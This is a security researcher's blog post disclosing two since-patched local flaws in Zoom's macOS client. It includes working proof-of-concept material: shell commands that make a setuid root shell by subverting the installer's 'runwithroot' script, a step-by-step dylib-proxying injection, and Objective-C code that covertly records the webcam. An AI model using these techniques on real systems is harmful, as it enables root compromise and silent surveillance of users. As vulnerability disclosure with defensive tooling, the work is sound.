üìù Update:

Zoom has patched both bugs in Version 4.6.9 (19273.0402):

[New Updates for macOS](https://support.zoom.us/hc/en-us/articles/201361963-New-Updates-for-macOS)

### Background

Given the current worldwide pandemic and government sanctioned lock-downs, working from home has become the norm ‚Ä¶for now. Thanks to this, Zoom, ‚Äúthe leader in modern enterprise video communications‚Äù is well on it‚Äôs way to becoming a household verb, and as a result, its stock price has soared! üìà

However if you value either your (cyber) security or privacy, you may want to think twice about using (the macOS version of) the app.

In this blog post, we‚Äôll start by briefly looking at recent security and privacy flaws that affected Zoom. Following this, we‚Äôll transition into discussing several new security issues that affect the latest version of Zoom‚Äôs macOS client.

üìù Though the new issues we'll discuss today remain unpatched, they both are local security issues.

As such, to be successfully exploited they required that malware or an attacker already have a foothold on a macOS system.

Though Zoom is incredibly popular it has a rather dismal security and privacy track record.

In June 2019, the security researcher [Jonathan Leitschuh](https://twitter.com/JLLeitschuh) discovered a trivially exploitable remote 0day vulnerability in the Zoom client for Mac, which ‚Äú*allow[ed] any malicious website to enable your camera without your permission*‚Äù üò±

![](../images/blog/blog_0x56/hijack.png)

> ‚Äú*This vulnerability allows any website to forcibly join a user to a Zoom call, with their video camera activated, without the user‚Äôs permission.*
>
> Additionally, if you‚Äôve ever installed the Zoom client and then uninstalled it, you still have a localhost web server on your machine that will happily re-install the Zoom client for you, without requiring any user interaction on your behalf besides visiting a webpage. This re-install ‚Äòfeature‚Äô continues to work to this day.‚Äù -Jonathan Leitschuh

Rather hilariously Apple (forcibly!) removed the vulnerable Zoom component from user‚Äôs macs worldwide via macOS‚Äôs `Malware Removal Tool` (`MRT`):

AFAIK, this is the only time Apple has taken this draconian action:

More recently Zoom suffered a rather embarrassing privacy faux pas, when it was uncovered that their iOS application was, ‚Äú*send[ing] data to Facebook even if you don‚Äôt have a Facebook account*‚Äù ‚Ä¶yikes!

Although Zoom was quick to patch the issue (by removing the (ir)responsible code), many security researchers were quick to point out that said code should have never made it into the application in the first place:

And finally today, noted macOS security researcher [Felix Seele](https://twitter.com/c1truz_) (and #OBTS v2.0 speaker!) noted that Zoom‚Äôs macOS installer (rather shadily) performs it‚Äôs ‚Äú*[install] job without you ever clicking install*‚Äù:

> Ever wondered how the [@zoom\_us](https://twitter.com/zoom_us?ref_src=twsrc%5Etfw) macOS installer does it‚Äôs job without you ever clicking install? Turns out they (ab)use preinstallation scripts, manually unpack the app using a bundled 7zip and install it to /Applications if the current user is in the admin group (no root needed).

> "*This is not strictly malicious but very shady and definitely leaves a bitter aftertaste. The application is installed without the user giving his final consent and a highly misleading prompt is used to gain root privileges. The same tricks that are being used by macOS malware.*" -Felix Seele

["Good Apps Behaving Badly: Dissecting Zoom‚Äôs macOS installer workaround"](https://www.vmray.com/cyber-security-blog/zoom-macos-installer-analysis-good-apps-behaving-badly/)

The (`preinstall`) scripts mentioned by Felix, can be easily viewed (and extracted) from Zoom‚Äôs installer package via the [Suspicious Package](https://mothersruin.com/software/SuspiciousPackage/) application:

### Local Zoom Security Flaw #1: Privilege Escalation to Root

Zoom‚Äôs security and privacy track record leaves much to be desired.

As such, today when Felix Seele also [noted](https://twitter.com/c1truz_/status/1244737675191619584) that the Zoom installer may invoke the `AuthorizationExecuteWithPrivileges` API to perform various privileged installation tasks, I decided to take a closer look. Almost immediately I uncovered several issues, including a vulnerability that leads to a trivial and reliable local privilege escalation (to root!).

> If the App is already installed but the current user is not admin, they Ôøºuse a helper tool called ‚ÄúzoomAutenticationTool‚Äù and the AuthorizationExecuteWithPrivileges API to spawn a password prompt identifying as ‚ÄúSystem‚Äù (!!) to gain root (including a typo). [pic.twitter.com/gp9DVCoVCm](https://t.co/gp9DVCoVCm)

> ‚Äî Felix (@c1truz\_) [March 30, 2020](https://twitter.com/c1truz_/status/1244737675191619584?ref_src=twsrc%5Etfw)

Stop me if you‚Äôve heard me talk (rant) about this before, but Apple clearly notes that the `AuthorizationExecuteWithPrivileges` API is deprecated and should not be used. Why? Because the API does not validate the binary that will be executed (as root!) ‚Ä¶meaning a local unprivileged attacker or piece of malware may be able to surreptitiously tamper or replace that item in order to escalate *their* privileges to root (as well):

![](../images/blog/blog_0x55/attack.png)

At DefCon 25, I presented a talk titled: ‚Äú[Death By 1000 Installers](https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken)‚Äù that covers this in great detail:

‚Ä¶moreover in my blog post ‚Äú[Sniffing Authentication References on macOS](blog_0x55.html)‚Äù from just last week, we covered this in great detail as well!

Finally, this insecure API was (also) discussed in detail in at [‚ÄúObjective by the Sea‚Äù v3.0](https://objectivebythesea.com/v3/), in a talk (by [Julia Vashchenko](https://twitter.com/iaronskaya)) titled: ‚Äú[Job(s) Bless Us! Privileged Operations on macOS](https://objectivebythesea.com/v3/talks/OBTS_v3_jVashchenko.pdf)‚Äù:

![](../images/blog/blog_0x56/deprecated.png)

Now it should be noted that if the `AuthorizationExecuteWithPrivileges` API is invoked with a path to a (SIP) protected or read-only binary (or script), this issue would be thwarted (as in such a case, unprivileged code or an attacker may not be able subvert the binary/script).

So the question here, in regards to Zoom is; ‚Äú*How are they utilizing this inherently insecure `API`‚Äù*? Because if they are invoking it insecurely, we may have a lovely privilege escalation vulnerability!

As discussed in my DefCon [presentation](https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken), the easiest way is answer this question is simply to run a process monitor, execute the installer package (or whatever invokes the `AuthorizationExecuteWithPrivileges` API) and observe the arguments that are passed to the `security_authtrampoline` (the `setuid` system binary that ultimately performs the privileged action):

![](../images/blog/blog_0x55/apiDetails.png)

The image above illustrates the flow of control initiated by the `AuthorizationExecuteWithPrivileges` API and shows how the item (binary, script, command, etc) to is to be executed with root privileges is passed as the first parameter to `security_authtrampoline` process. If this parameter, this item, is editable (i.e. can be maliciously subverted) by an unprivileged attacker then that‚Äôs a clear security issue!

Let‚Äôs figure out what Zoom is executing via `AuthorizationExecuteWithPrivileges`!

First we download the latest version of Zoom‚Äôs installer for macOS (`Version 4.6.8 (19178.0323)`) from `https://zoom.us/download`:

![](../images/blog/blog_0x56/version.png)

Then, we fire up our macOS Process Monitor (<https://objective-see.com/products/utilities.html#ProcessMonitor)>, and launch the Zoom installer package (`Zoom.pkg`).

If the user installing Zoom is running as a ‚Äòstandard‚Äô (read: non-admin) user, the installer may prompt for administrator credentials:

![](../images/blog/blog_0x56/prompt.png)

‚Ä¶as expected our process monitor will observe the launching (`ES_EVENT_TYPE_NOTIFY_EXEC`) of `/usr/libexec/security_authtrampoline` to handle the authorization request:

```

# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty
{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "uid" : 0,
    "arguments" : [
      "/usr/libexec/security_authtrampoline",
      "./runwithroot",
      "auth 3",
      "/Users/tester/Applications/zoom.us.app",
      "/Applications/zoom.us.app"
    ],
    "ppid" : 1876,
    "ancestors" : [
      1876,
      1823,
      1820,
      1
    ],
    "signing info" : {
      "csFlags" : 603996161,
      "signatureIdentifier" : "com.apple.security_authtrampoline",
      "cdHash" : "DC98AF22E29CEC96BB89451933097EAF9E01242",
      "isPlatformBinary" : 1
    },
    "path" : "/usr/libexec/security_authtrampoline",
    "pid" : 1882
  },
  "timestamp" : "2020-03-31 03:18:45 +0000"
}

```

And what is Zoom attempting to execute as root (i.e. what is passed to `security_authtrampoline`?)

‚Ä¶a bash script named `runwithroot`.

If the user provides the requested credentials to complete the install, the `runwithroot` script will be executed as **root** (note: `uid: 0`):

```

{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "uid" : 0,
    "arguments" : [
      "/bin/sh",
      "./runwithroot",
      "/Users/tester/Applications/zoom.us.app",
      "/Applications/zoom.us.app"
    ],
    "ppid" : 1876,
    "ancestors" : [
      1876,
      1823,
      1820,
      1
    ],
    "signing info" : {
      "csFlags" : 603996161,
      "signatureIdentifier" : "com.apple.sh",
      "cdHash" : "D3308664AA7E12DF271DC78A7AE61F27ADA63BD6",
      "isPlatformBinary" : 1
    },
    "path" : "/bin/sh",
    "pid" : 1882
  },
  "timestamp" : "2020-03-31 03:18:45 +0000"
}

```

The contents of `runwithroot` are irrelevant. All that matters is, can a local, unprivileged attacker (or piece of malware) subvert the script prior its execution as root? (As again, recall the `AuthorizationExecuteWithPrivileges` API does not validate what is being executed).

Since it‚Äôs Zoom we‚Äôre talking about, the answer is of course yes! üòÖ

We can confirm this by noting that during the installation process, the macOS Installer (which handles installations of `.pkgs`) copies the `runwithroot` script to a user-writable temporary directory:
```

tester@users-Mac T % pwd
/private/var/folders/v5/s530008n11dbm2n2pgzxkk700000gp/T
tester@users-Mac T % ls -lart com.apple.install.v43Mcm4r
total 27224
-rwxr-xr-x   1 tester  staff     70896 Mar 23 02:25 zoomAutenticationTool
-rw-r--r--   1 tester  staff       513 Mar 23 02:25 zoom.entitlements
-rw-r--r--   1 tester  staff  12008512 Mar 23 02:25 zm.7z
-rwxr-xr-x   1 tester  staff       448 Mar 23 02:25 runwithroot
...

```

Lovely - it looks like we‚Äôre in business and may be able to gain root privileges!

Exploitation of these types of bugs is trivial and reliable (though requires some patience ‚Ä¶as you have to wait for the installer or updater to run!) as is show in the following diagram:

![](../images/blog/blog_0x56/exploitation.png)

To exploit Zoom, a local non-privileged attacker can simply replace or subvert the `runwithroot` script during an install (or upgrade?) to gain root access.

For example to pop a root shell, simply add the following commands to the `runwithroot` script:

```
1cp /bin/ksh /tmp
2chown root:wheel /tmp/ksh
3chmod u+s /tmp/ksh
4open /tmp/ksh
```

Le boom üí•:

### Local Zoom Security Flaw #2: Code Injection for Mic & Camera Access

In order for Zoom to be useful it requires access to the system‚Äôs mic and camera.

On recent versions of macOS, this requires explicit user approval (which, from a security and privacy point of view is a good thing):

![](../images/blog/blog_0x56/access.png)

Unfortunately, Zoom has (for reasons unbeknown to me), a specific ‚Äúexclusion‚Äù that allows malicious code to be injected into its process space, where said code can piggy-back off Zoom‚Äôs (mic and camera) access! This give malicious code a way to either record Zoom meetings, or worse, access the mic and camera at arbitrary times (without the user access prompt)!

Modern macOS applications are compiled with a feature called the ‚ÄúHardened Runtime‚Äù. This security enhancement is [well documented](https://developer.apple.com/documentation/security/hardened_runtime) by Apple, who note:

> "*The Hardened Runtime, along with System Integrity Protection (SIP), protects the runtime integrity of your software by preventing certain classes of exploits, like code injection, dynamically linked library (DLL) hijacking, and process memory space tampering."* -Apple

I‚Äôd like to think that Apple attended my 2016 at [ZeroNights](https://twitter.com/ZeroNights) in Moscow, where I noted this feature would be a great addition to macOS:
![](../images/blog/blog_0x56/suggestion.jpeg)

We can check that Zoom (or any application) is validly signed and compiled with the ‚ÄúHardened Runtime‚Äù via the `codesign` utility:

```

$ codesign -dvvv /Applications/zoom.us.app/
Executable=/Applications/zoom.us.app/Contents/MacOS/zoom.us
Identifier=us.zoom.xos
Format=app bundle with Mach-O thin (x86_64)
CodeDirectory v=20500 size=663 flags=0x10000(runtime) hashes=12+5 location=embedded

...
Authority=Developer ID Application: Zoom Video Communications, Inc. (BJ4HAAB9B3)
Authority=Developer ID Certification Authority
Authority=Apple Root CA

```

A `flags` value of `0x10000(runtime)` indicates that the application was compiled with the ‚ÄúHardened Runtime‚Äù option, and thus said runtime, should be enforced by macOS for this application.

Ok so far so good! Code injection attacks should be generically thwarted due to this!

‚Ä¶but (again) this is Zoom, so not so fast üòÖ

Let‚Äôs dump Zoom‚Äôs entitlements (entitlements are code-signed capabilities and/or exceptions), again via the `codesign` utility:

```

codesign -d --entitlements :- /Applications/zoom.us.app/
Executable=/Applications/zoom.us.app/Contents/MacOS/zoom.us
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN...>
<plist version="1.0">
<dict>
  <key>com.apple.security.automation.apple-events</key>
  <true/>
  <key>com.apple.security.device.audio-input</key>
  <true/>
  <key>com.apple.security.device.camera</key>
  <true/>
  <key>com.apple.security.cs.disable-library-validation</key>
  <true/>
  <key>com.apple.security.cs.disable-executable-page-protection</key>
  <true/>
</dict>
</plist>

```

The `com.apple.security.device.audio-input` and `com.apple.security.device.camera` entitlements are required as Zoom needs (user-approved) mic and camera access.

However the `com.apple.security.cs.disable-library-validation` entitlement is interesting. In short it tells macOS, ‚Äú*hey, yah I still (kinda?) want the ‚ÄúHardened Runtime‚Äù, but please allow any libraries to be loaded into my address space*‚Äù ‚Ä¶in other words, library injections are a go!

Apple [documents](https://developer.apple.com/documentation/bundleresources/entitlements/com_apple_security_cs_disable-library-validation?language=objc) this entitlement as well:

![](../images/blog/blog_0x56/entitlement.png)

So, thanks to this entitlement we can (in theory) circumvent the ‚ÄúHardened Runtime‚Äù and inject a malicious library into Zoom (for example to access the mic and camera without an access alert).

There are variety of ways to coerce a remote process to load a dynamic library at load time, or at runtime. Here we‚Äôll focus on a method I call ‚Äúdylib proxying‚Äù, as it‚Äôs both stealthy and persistent (malware authors, take note!).

In short, we replace a legitimate library that the target (i.e. Zoom) depends on, then, proxy all requests made by Zoom back to the original library, to ensure legitimate functionality is maintained. Both the app, and the user remains none the wiser!

üìù Another benefit of the "dylib proxying" is that it does not compromise the code signing certificate of the binary (however, it may affect the signature of the application bundle).

A benefit of this, is that Apple's runtime signature checks (e.g. for mic & camera access) do not seem to detect the malicious library, and thus still afford the process continued access to the mic & camera.

This is a method I‚Äôve often (ab)used before in a handful of exploits, for example to (previously) bypass SIP:

![](../images/blog/blog_0x56/proxy.png)

As the image illustrates one could proxied the `IASUtilities` library so that malicious code would be automatically loaded (‚Äòinjected‚Äô) by the macOS dynamic linker (`dyld`) into Apple‚Äôs installer (a prerequisite for the SIP bypass exploit).

Here, we‚Äôll similarly proxy a library (required by Zoom), such that our malicious library will be automatically loaded into Zoom‚Äôs trusted process address space any time its launched.

To determine what libraries Zoom is linked against (read: requires), and thus will be automatically loaded by the macOS dynamic loader, we can use the `otool` with the `-L` flag:
```

$ otool -L /Applications/zoom.us.app/Contents/MacOS/zoom.us
/Applications/zoom.us.app/Contents/MacOS/zoom.us:
  @rpath/curl64.framework/Versions/A/curl64
  /System/Library/Frameworks/Cocoa.framework/Versions/A/Cocoa
  /System/Library/Frameworks/Foundation.framework/Versions/C/Foundation
  /usr/lib/libobjc.A.dylib
  /usr/lib/libc++.1.dylib
  /usr/lib/libSystem.B.dylib
  /System/Library/Frameworks/AppKit.framework/Versions/C/AppKit
  /System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation
  /System/Library/Frameworks/CoreServices.framework/Versions/A/CoreServices

```

üìù Due to macOS's System Integrity Protection (SIP), we cannot replace any system libraries.

As such, for an application to be ‚Äòvulnerable‚Äô to ‚Äúdylib proxying‚Äù it must load a library from either its own application bundle, or another non-SIP‚Äôd location (and must not be compiled with the ‚Äúhardened runtime‚Äù (well unless it has the com.apple.security.cs.disable-library-validation entitlement exception)).

Looking at the Zoom‚Äôs library dependencies, we see: `@rpath/curl64.framework/Versions/A/curl64`. We can resolve the runpath (`@rpath`) again via `otool`, this time with the `-l` flag:

```

$ otool -l /Applications/zoom.us.app/Contents/MacOS/zoom.us
...

Load command 22
          cmd LC_RPATH
      cmdsize 48
         path @executable_path/../Frameworks (offset 12)

```

The `@executable_path` will be resolved at runtime to the binary‚Äôs path, thus the dylib will be loaded out of: `/Applications/zoom.us.app/Contents/MacOS/../Frameworks`, or more specifically `/Applications/zoom.us.app/Contents/Frameworks`.

Taking a peak at Zoom‚Äôs application bundle, we can confirm the presence of the `curl64` (and many other frameworks and libraries) that will all be loaded whenever Zoom is launched:

![](../images/blog/blog_0x56/frameworks.png)

üìù For details on "runpaths" (@rpath) and executable paths (@executable\_path) as well as more information on creating a proxy dylib, check out my paper:

["Dylib Hijacking on OS X"](https://www.virusbulletin.com/pdf/magazine/2015/vb201503-dylib-hijacking.pdf)

For simplicity sake, we‚Äôll target Zoom‚Äôs `libssl.1.0.0.dylib` (as it‚Äôs a stand-alone library, versus a framework/bundle) as the library we‚Äôll proxy.

Step #1 is to rename the legitimate library. For example here, we simply prefix it with an underscore: `_libssl.1.0.0.dylib`

Now, if we running Zoom, it will (as expected) crash, as a library it requires (`libssl.1.0.0.dylib`) is ‚Äòmissing‚Äô:

```

patrick$ /Applications/zoom.us.app/Contents/MacOS/zoom.us
dyld: Library not loaded: @rpath/libssl.1.0.0.dylib
Referenced from: /Applications/zoom.us.app/Contents/Frameworks/curl64.framework/Versions/A/curl64
Reason: image not found
Abort trap: 6

```

This is actually good news, as it means if we place any library named `libssl.1.0.0.dylib` in Zoom‚Äôs `Frameworks` directory `dyld` will (blindly) attempt to load it.

Step #2, let‚Äôs create a simple library, with a custom constructor (that will be automatically invoked when the library is loaded):

```
 1__attribute__((constructor))
 2static void constructor(void)
 3{
 4    char path[PROC_PIDPATHINFO_MAXSIZE];
 5    proc_pidpath (getpid(), path, sizeof(path)-1);
 6
 7    NSLog(@"zoom zoom: loaded in %d: %s", getpid(), path);
 8
 9    return;
10}
```

‚Ä¶and save it to `/Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylib`.

Then we re-run Zoom:

```

patrick$ /Applications/zoom.us.app/Contents/MacOS/zoom.us
zoom zoom: loaded in 39803: /Applications/zoom.us.app/Contents/MacOS/zoom.us

```

Hooray! Our library is loaded by Zoom.

Unfortunately Zoom then exits right away. This is also not unexpected as our `libssl.1.0.0.dylib` is not an ssl library‚Ä¶that is to say, it doesn‚Äôt export any required functionality (i.e. ssl capabilities!). So Zoom (gracefully) fails.

Not to worry, this is where the beauty of ‚Äúdylib proxying‚Äù shines.

Step #3, via simple linker directives, we can tell Zoom, ‚Äú*hey, while our library don‚Äôt implement the required (ssl) functionality you‚Äôre looking for, we know who does!*‚Äù and then point Zoom to the original (legitimate) ssl library (that we renamed `_libssl.1.0.0.dylib`).

Diagrammatically this looks like so:
![](../images/blog/blog_0x56/reexport.png)

To create the required linker directive, we add the `-XLinker` `-reexport_library` and then the path to the proxy library target, under ‚Äú`Other Linker Flags`‚Äù in Xcode:

![](../images/blog/blog_0x56/linkerFlags.png)

To complete the creation of the proxy library, we must also update the embedded `reexport` path (within our proxy dylib) so that it points to the (original, albeit renamed) ssl library. Luckily Apple provides the `install_name_tool` tool just for this purpose:

```

patrick$ install_name_tool -change @rpath/libssl.1.0.0.dylib /Applications/zoom.us.app/Contents/Frameworks/_libssl.1.0.0.dylib  /Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylib

```

We can now confirm (via `otool`) that our proxy library references the original ssl libary. Specifically, we note that our proxy dylib (`libssl.1.0.0.dylib`) contains a `LC_REEXPORT_DYLIB` that points to the original ssl library (`_libssl.1.0.0.dylib`):

```

patrick$ otool -l /Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylib

...
Load command 11
          cmd LC_REEXPORT_DYLIB
      cmdsize 96
         name /Applications/zoom.us.app/Contents/Frameworks/_libssl.1.0.0.dylib
   time stamp 2 Wed Dec 31 14:00:02 1969
      current version 1.0.0
compatibility version 1.0.0

```

Re-running Zoom confirms that our proxy library (and the original ssl library) are both loaded, and that Zoom perfectly functions as expected! üî•

![](../images/blog/blog_0x56/injected.png)

The appeal of injection a library into Zoom, revolves around its (user-granted) access to the mic and camera. Once our malicious library is loaded into Zoom‚Äôs process/address space, the library **will automatically inherit any/all of Zooms access rights/permissions**!

This means that if the user as given Zoom access to the mic and camera (a more than likely scenario), our injected library can equally access those devices.

üìù If Zoom has not been granted access to the mic or the camera, our library should be able to problematically detect this (to silently 'fail').

‚Ä¶or we can go ahead and still attempt to access the devices, as the access prompt will originate ‚Äúlegitimately‚Äù from Zoom and thus likely to be approved by the unsuspecting user.

To test this ‚Äúaccess inheritance‚Äù I added some code to the injected library to record a few seconds of video off the webcam:

```
 1
 2  AVCaptureDevice* device = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
 3
 4  session = [[AVCaptureSession alloc] init];
 5  output = [[AVCaptureMovieFileOutput alloc] init];
 6
 7  AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:device
 8                                error:nil];
 9
10  movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];
11
12  [self.session addInput:input];
13  [self.session addOutput:output];
14  [self.session addOutput:movieFileOutput];
15
16  [self.session startRunning];
17
18  [movieFileOutput startRecordingToOutputFileURL:[NSURL fileURLWithPath:@"zoom.mov"]
19                   recordingDelegate:self];
20
21  //stop recoding after 5 seconds
22  [NSTimer scheduledTimerWithTimeInterval:5 target:self
23           selector:@selector(finishRecord:) userInfo:nil repeats:NO];
24
25  ...
```

Normally this code would trigger an alert from macOS, asking the user to confirm access to the (mic) and camera. However, as we‚Äôre injected into Zoom (which was already given access by the user), no additional prompts will be displayed, and the injected code was able to arbitrarily record audio and video.

Interestingly, the test captured the real brains behind this research:

![](../images/blog/blog_0x56/pup.png)

üìù Could malware (ab)use Zoom to capture audio and video at arbitrary times (i.e. to spy on users?). If Zoom is installed and has been granted access to the mic and camera, then yes!

In fact the /usr/bin/open utility supports the -j flag, which ‚Äúlaunches the app hidden‚Äù!

Voila!

### Conclusion

Today, we uncovered two (local) security issues affecting Zoom‚Äôs macOS application.
Given Zoom‚Äôs privacy and security track record this should surprise absolutely zero people.

First, we illustrated how unprivileged attackers or malware may be able to exploit Zoom‚Äôs installer to gain root privileges.

Following this, due to an ‚Äôexception‚Äô entitlement, we showed how to inject a malicious library into Zoom‚Äôs trusted process context. This affords malware the ability to record all Zoom meetings, or, simply spawn Zoom in the background to access the mic and webcam at arbitrary times! üò±

The former is problematic as many enterprises (now) utilize Zoom for (likely) sensitive business meetings, while the latter is problematic as it affords malware the opportunity to surreptitious access either the mic or the webcam, with no macOS alerts and/or prompts.

[OSX.FruitFly](https://www.forbes.com/sites/thomasbrewster/2018/01/10/man-charged-over-super-creepy-apple-mac-fruitfly-malware/#179eca30273b) v2.0 anybody?

![](../images/blog/blog_0x56/fruitfly.png)

So, what to do? Honestly, if you care about your security and/or privacy perhaps stop using Zoom. And if using Zoom is a must, I‚Äôve written several **free** tools that may help detect these attacks. üòá

First, [OverSight](https://objective-see.com/products/oversight.html) can alert you anytime anybody access the mic or webcam:

![](../images/blog/blog_0x56/oversight.png)

Thus even if an attacker or malware is (ab)using Zoom ‚Äúinvisibly‚Äù in the background, OverSight will generate an alert.

Another (free) tool is [KnockKnock](https://objective-see.com/products/knockknock.html) that can generically detect proxy libraries:

![](../images/blog/blog_0x56/knockknock.png)

‚Ä¶it‚Äôs almost as if offensive cyber-security research can facilitate the creation of powerful defensive tools! üõ†Ô∏è üòá
